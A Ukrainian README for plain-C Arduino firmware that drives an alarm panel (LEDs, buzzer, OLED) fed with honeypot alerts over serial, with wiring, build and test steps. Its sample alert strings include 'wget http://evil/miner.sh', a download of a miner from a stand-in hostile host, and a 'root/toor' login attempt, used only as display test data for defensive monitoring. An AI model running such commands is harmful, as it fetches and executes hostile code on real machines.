# Панель тривоги HoneyTrap: прошивка (чистий C, avr-gcc)

Прошивка для Arduino Uno (ATmega328P) без Arduino IDE і без бібліотек Arduino.

## Файли

| Файл | Що робить |
|---|---|
| `main.c` | Головна логіка: світлодіоди, бузер, кнопка, розбір рядків, що показувати на екрані |
| `uart.c/.h` | Приймає рядки з ноутбука через USB (9600 бод, через переривання) |
| `i2c.c/.h` | Апаратний I2C (TWI) на пінах A4/A5 |
| `oled.c/.h` | Драйвер екрана SSD1306 128x64: очистити, текст звичайний і великий |
| `font.h` | Шрифт 5x7 (лежить у flash) |
| `Makefile` | Збірка і прошивка |

Хто кого викликає:
`main` → `uart_*` (рядки), `oled_*` (екран) → `i2c_*` (дроти A4/A5).

## Підключення

| Пін Arduino | Куди |
|---|---|
| D2 | резистор 220 Ом → зелений LED → GND |
| D3 | резистор 220 Ом → жовтий LED → GND |
| D4 | резистор 220 Ом → червоний LED → GND |
| D5 | активний бузер (+), (−) → GND |
| D6 | кнопка → GND |
| A4 / A5 | OLED SDA / SCL |
| 5V / GND | OLED VCC / GND |

## Що приходить з ноутбука

Один рядок на алерт, швидкість 9600:

```
<рівень>;<ip>;<повідомлення>
```

Рівень: `L`, `M` або `H`. Приклад: `H;10.0.0.5;wget http://evil/miner.sh`

## Як панель реагує

| Стан | Світлодіоди | Звук | Екран |
|---|---|---|---|
| спокій | зелений | — | ALL QUIET |
| LOW | зелений + жовтий | — | LOW, IP, повідомлення |
| MEDIUM | жовтий | 1 писк | MEDIUM, IP, повідомлення |
| HIGH | червоний блимає | 3 писки | HIGH, IP, повідомлення |

Рівень лише зростає. Якщо горить HIGH, а прийшов LOW, то збільшується тільки лічильник `alerts` унизу.
Кнопка повертає панель у спокій. На старті всі 3 LED загоряються і бузер коротко пищить: це самотест.

## Збірка і прошивка (WSL / Ubuntu)

1. Встанови інструменти:
   ```sh
   sudo apt install gcc-avr avr-libc avrdude make
   ```
2. Підключи плату до WSL. У PowerShell **від адміністратора** на Windows (один раз встанови `winget install usbipd`):
   ```powershell
   usbipd list                      # знайди BUSID плати, наприклад 2-1
   usbipd bind --busid 2-1          # тільки першого разу
   usbipd attach --wsl --busid 2-1
   ```
   У WSL перевір: `ls /dev/ttyACM* /dev/ttyUSB*`
3. Дай собі доступ до порту (один раз, потім перезапусти WSL):
   ```sh
   sudo usermod -aG dialout $USER
   ```
4. Збери і залий:
   ```sh
   make
   make flash                       # або: make flash PORT=/dev/ttyUSB0
   ```

## Перевірка без HoneyTrap

**Варіант 1: VS Code.** Розширення *Serial Monitor* (Microsoft): обери порт, 9600, закінчення рядка `LF`, надсилай
`L;1.2.3.4;test`, потім `H;1.2.3.4;wget x`.

**Варіант 2: термінал WSL:**
```sh
stty -F /dev/ttyACM0 9600 raw -echo
exec 3<>/dev/ttyACM0                 # відкрити порт один раз (плата перезапуститься)
sleep 2                              # чекаємо самотест
printf 'M;10.0.0.5;LOGIN root/toor\n' >&3
printf 'H;10.0.0.5;wget http://evil/miner.sh\n' >&3
exec 3>&-                            # закрити порт
```

Після `usbipd attach` прошивка працює й без WSL: Serial Monitor можна запускати і з Windows (порт COMx).

## Якщо щось не так

- **Екран чорний, а LED працюють.** Перевір SDA→A4 і SCL→A5 (часто їх плутають місцями). Деякі модулі мають адресу `0x3D`: зміни `OLED_ADDR` в `oled.c`.
- **LED не світиться.** Переверни його: довга ніжка має бути з боку резистора.
- **Бузер мовчить.** Потрібен *активний* бузер; перевір полярність.
- **`avrdude: not in sync`.** Спробуй інший порт або повільнішу швидкість: у `Makefile` заміни `-b 115200` на `-b 57600`.
- **`Permission denied` на порті.** Не виконано крок 3, або WSL не перезапущено.
